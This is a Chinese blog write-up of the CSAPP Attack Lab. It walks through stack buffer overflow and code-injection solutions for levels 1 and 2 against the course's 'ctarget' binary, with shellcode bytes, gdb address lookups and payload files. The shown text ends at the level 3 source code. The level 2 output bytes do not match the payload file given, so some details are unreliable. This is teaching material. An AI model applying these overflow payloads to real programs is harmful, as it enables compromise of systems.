<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>CSAPP Lab3 Understanding Buffer Overflow Bugs - Blowin&#039; in the Wind</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Welcome to H&#039;s Blog"><meta name="msapplication-TileImage" content="/img/kitty.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Welcome to H&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="由于是直接上手做的，看完 readme 后也是一头雾水，结合 attacklab.pdf (cmu.edu) 和原书第三版的 3.10.3 和 3.10.4 才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在 mac 上反编译了 ctarget，注意 csapp 的系列实验都应在 x86 环境下进行。"><meta property="og:type" content="blog"><meta property="og:title" content="CSAPP Lab3 Understanding Buffer Overflow Bugs"><meta property="og:url" content="https://zion4h.github.io/2022/06/03/CSAPP-LAB-3/"><meta property="og:site_name" content="Blowin&#039; in the Wind"><meta property="og:description" content="由于是直接上手做的，看完 readme 后也是一头雾水，结合 attacklab.pdf (cmu.edu) 和原书第三版的 3.10.3 和 3.10.4 才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在 mac 上反编译了 ctarget，注意 csapp 的系列实验都应在 x86 环境下进行。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/zion4h/picture-home@main/img252.jpg"><meta property="article:published_time" content="2022-06-03T04:00:00.000Z"><meta property="article:modified_time" content="2025-04-19T08:22:12.038Z"><meta property="article:author" content="zion h4"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://cdn.jsdelivr.net/gh/zion4h/picture-home@main/img252.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://zion4h.github.io/2022/06/03/CSAPP-LAB-3/"},"headline":"CSAPP Lab3 Understanding Buffer Overflow Bugs","image":["https://cdn.jsdelivr.net/gh/zion4h/picture-home@main/img252.jpg"],"datePublished":"2022-06-03T04:00:00.000Z","dateModified":"2025-04-19T08:22:12.038Z","author":{"@type":"Person","name":"zion h4"},"publisher":{"@type":"Organization","name":"Blowin' in the Wind","logo":{"@type":"ImageObject","url":"https://zion4h.github.io/img/kitty.png"}},"description":"由于是直接上手做的，看完 readme 后也是一头雾水，结合 attacklab.pdf (cmu.edu) 和原书第三版的 3.10.3 和 3.10.4 才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在 mac 上反编译了 ctarget，注意 csapp 的系列实验都应在 x86 环境下进行。"}</script><link rel="canonical" href="https://zion4h.github.io/2022/06/03/CSAPP-LAB-3/"><link rel="alternate" href="https://zion4h.github.io/atom.xml" title="Blowin&#039; in the Wind" type="application/atom+xml"><link rel="icon" href="/img/kitty.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/mono-blue.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?a9f2a7370cea3cc47e78ce7e91a24ccc";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><meta name="msvalidate.01" content="E57A0E10BC15ABA0F469F0806A5EDEB0"><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-PB49LZ7RGB" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-PB49LZ7RGB');</script><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/kitty.png" alt="Blowin&#039; in the Wind" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zion4h"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="https://cdn.jsdelivr.net/gh/zion4h/picture-home@main/img252.jpg" alt="CSAPP Lab3 Understanding Buffer Overflow Bugs"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-06-03T04:00:00.000Z" title="6/3/2022, 12:00:00 PM">2022-06-03</time>发表</span><span class="level-item"><time dateTime="2025-04-19T08:22:12.038Z" title="4/19/2025, 4:22:12 PM">2025-04-19</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a><span> / </span><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B/Labs/">Labs</a><span> / </span><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B/Labs/CMU-15-213/">CMU 15-213</a></span><span class="level-item">23 分钟读完 (大约3450个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CSAPP Lab3 Understanding Buffer Overflow Bugs</h1><div class="content"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p>由于是直接上手做的，看完 readme 后也是一头雾水，结合 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf (cmu.edu)</a> 和原书第三版的 3.10.3 和 3.10.4 才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在 mac 上反编译了 ctarget，注意 csapp 的系列实验都应在 x86 环境下进行。</p>
<span id="more"></span>
<h2 id="准备">准备</h2>
<p>实验 3 主要分成两个部分，在 ctarget 做代码注入 CI 攻击，在 rtarget 上做返回导向编程 ROP 攻击。在 CI 部分有 3 个 level，而在 ROP 部分有两个 level，由于我们不是 cmu 的学生，所以在调试命令时注意加上 - q 禁止发送结果给服务器。</p>
<p>为了方便，我们将 ctarget 和 rtarget 反汇编到 ctarget.s 和 rtarget.s 中：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]# objdump -d rtarget &gt; rtarget.s</span><br><span class="line">[root@MiWiFi-R4A-srv target1]# objdump -d ctarget &gt; ctarget.s</span><br></pre></td></tr></table></figure>
<h2 id="level1">level1</h2>
<p>这里是 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf (cmu.edu)</a> 给出的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> val;</span><br><span class="line"> val = getbuf();</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line"> validate(<span class="number">1</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8: <span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>           <span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017ac: <span class="number">48</span> <span class="number">89</span> e7              <span class="keyword">mov</span>    %rsp,%rdi</span><br><span class="line">  4017af: e8 8c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4: b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  4017b9: <span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>           <span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017bd: c3                    retq   </span><br><span class="line">  4017be: <span class="number">90</span>                    <span class="keyword">nop</span></span><br><span class="line">  4017bf: <span class="number">90</span>                    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0: <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>           <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  4017c4: c7 <span class="number">05</span> 0e <span class="number">2d</span> <span class="number">20</span> <span class="number">00</span> <span class="number">01</span>  movl   <span class="number">$0</span>x1,<span class="number">0x202d0e</span>(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  4017ce: bf c5 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x4030c5,%edi</span><br><span class="line">  4017d3: e8 e8 f4 ff ff        callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8: bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  4017<span class="built_in">dd</span>: e8 ab <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>        callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2: bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x0,%edi</span><br><span class="line">  4017e7: e8 <span class="number">54</span> f6 ff ff        callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>在 level1 中我们需要通过 CI 让 test 执行时跳转到 touch1 中，而程序的跳转和 rsp 寄存器有关，一开始 rsp 给了 0x28 的空间供 getbuf 栈帧使用，但如果 getbuf 输入了 40 字节以上，就会将父帧 test 的状态破坏。基于这个原理，我们处理方式也比较简单直接，首先用随意内容填充前 40 字节，再追加 touch1 的入口地址，这样当 getbuf 返回时，rsp 会将该地址弹出到 pc，从而成功执行 touch1 的代码。由于 touch1 最后直接 exit 了，所以我们无需关心进入 touch1 之后发生的事情。</p>
<p>另外，为了方便我们填充字节，lab 提供了一个 16 进制转换工具，我们按照附录示例方式写入即可，写入方式也挺多样的。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="number">40</span> 个空白字符 */</span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* 目标 touch1 入口地址 */</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]<span class="comment"># ./hex2raw &lt; ctarget.l1.txt | ./ctarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line"> user <span class="built_in">id</span> bovik</span><br><span class="line"> course 15213-f15</span><br><span class="line"> lab attacklab</span><br><span class="line"> result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>另外，Intel 8086 系列都是小端对齐的，也就是低地址放低位，如 0x00000000004017c0，c0 在最低位所以应该放在地址最小的位置，也就是起始位置。这里可能不好想象，比如一台 64 位机器，栈上每层都是 8 字节，我的 ctarget.l1.txt 也是按这种方式排列的，便于参考阅读。</p>
<h2 id="level2">level2</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span> <span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"> vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">  validate(<span class="number">2</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">  fail(<span class="number">2</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec: <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>           <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  4017f0: <span class="number">89</span> fa                 <span class="keyword">mov</span>    %edi,%edx</span><br><span class="line">  4017f2: c7 <span class="number">05</span> e0 2c <span class="number">20</span> <span class="number">00</span> <span class="number">02</span>  movl   <span class="number">$0</span>x2,<span class="number">0x202ce0</span>(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>类似的，如果我们需要切换到 touch2，除了引导 touch2 的入口地址 0x4017ec 外还需要给出参数 val，让 val 和 cookie（0x59b997fa）相等。这里需要我们插入代码段，完整做完 lab2 后已经不难写出如下代码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl    <span class="number">$0</span>x59b997fa, %edi # 提供 val</span><br><span class="line">pushq   <span class="number">0x4017ec</span>          # touch2</span><br><span class="line">retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>movl、movq 都是 mov 操作，前者是 32 位，后者 64 位，实验给的 cookie 显然用 32 位即可，写汇编时注意尾部提行，不然可能会报 warning。</p>
<p>现在我们将其编译后再反编译获取其字节码表达形式，注意，这里有个问题是 objdump 反编译时可能会遇到格式问题，我因为这个原因失败了好几次（默认 x86-84 格式），最好是手动选择 intel 或者 att 格式，前者适用于 windows、DOS，后者适用于 Linux。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l2<span class="number">.</span>o：     文件格式 elf64-x86-<span class="number">64</span></span><br><span class="line"></span><br><span class="line">Disassembly of <span class="meta">section</span> .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>: bf fa <span class="number">97</span> b9 <span class="number">59</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x59b997fa,%edi</span><br><span class="line">   <span class="number">5</span>: ff <span class="number">34</span> <span class="number">25</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span>  pushq  <span class="number">0x4017ec</span></span><br><span class="line"><span class="symbol">   c:</span> c3                    retq</span><br></pre></td></tr></table></figure>
<p>但是我最后还是失败了，我参考了别人成功通过的代码，发现我反汇编后得到的 pushq 和他们的不一样，所以果断换另外一种不需要 pushq 的方法，直接将其放到栈上。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     <span class="number">$0</span>x59b997fa, %rdi # 提供 val</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l2<span class="number">.</span>o：     文件格式 elf64-x86-<span class="number">64</span></span><br><span class="line"></span><br><span class="line">Disassembly of <span class="meta">section</span> .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>: <span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span>  <span class="keyword">mov</span>    <span class="number">$0</span>x59b997fa,%rdi</span><br><span class="line">   <span class="number">7</span>: c3                    retq</span><br></pre></td></tr></table></figure>
<p>我们将这段代码通过 getbuf 传到 rsp-0x28 处，再用类似 level1 的方法跳转到这里执行这段代码。现在整个程序逻辑就比较清晰了，getbuf 执行完后进入我们的插入代码中，执行完后进入 touch2。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]<span class="comment"># gdb ctarget</span></span><br><span class="line">GNU gdb (GDB) Red Hat Enterprise Linux 10.2-8.el9</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">...（省略了）</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">=&gt; 0x00000000004017a8 &lt;+0&gt;: sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;: mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;: call   0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;: mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;: add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;: ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) p <span class="variable">$rsp</span></span><br><span class="line"><span class="variable">$1</span> = (void *) 0x5561dca0</span><br><span class="line">(gdb) stepi</span><br><span class="line">14 <span class="keyword">in</span> buf.c</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;: sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">=&gt; 0x00000000004017ac &lt;+4&gt;: mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;: call   0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;: mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;: add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;: ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) p <span class="variable">$rsp</span></span><br><span class="line"><span class="variable">$2</span> = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>
<p>通过 GDB 我们轻松获得 rsp 的位置是 0x5561dca0 而 rsp-0x28 的位置自然是 0x5561dc78 了，这就是我们的跳转位置。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 插入代码段 */</span><br><span class="line">78 dc 61 55 00 00 00 00 /* rsp-0x24 */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* 目标 touch2 入口地址 */</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]<span class="comment"># ./hex2raw &lt; ctarget.l2.txt | ./ctarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line"> user <span class="built_in">id</span> bovik</span><br><span class="line"> course 15213-f15</span><br><span class="line"> lab attacklab</span><br><span class="line"> result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h2 id="level3">level3</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
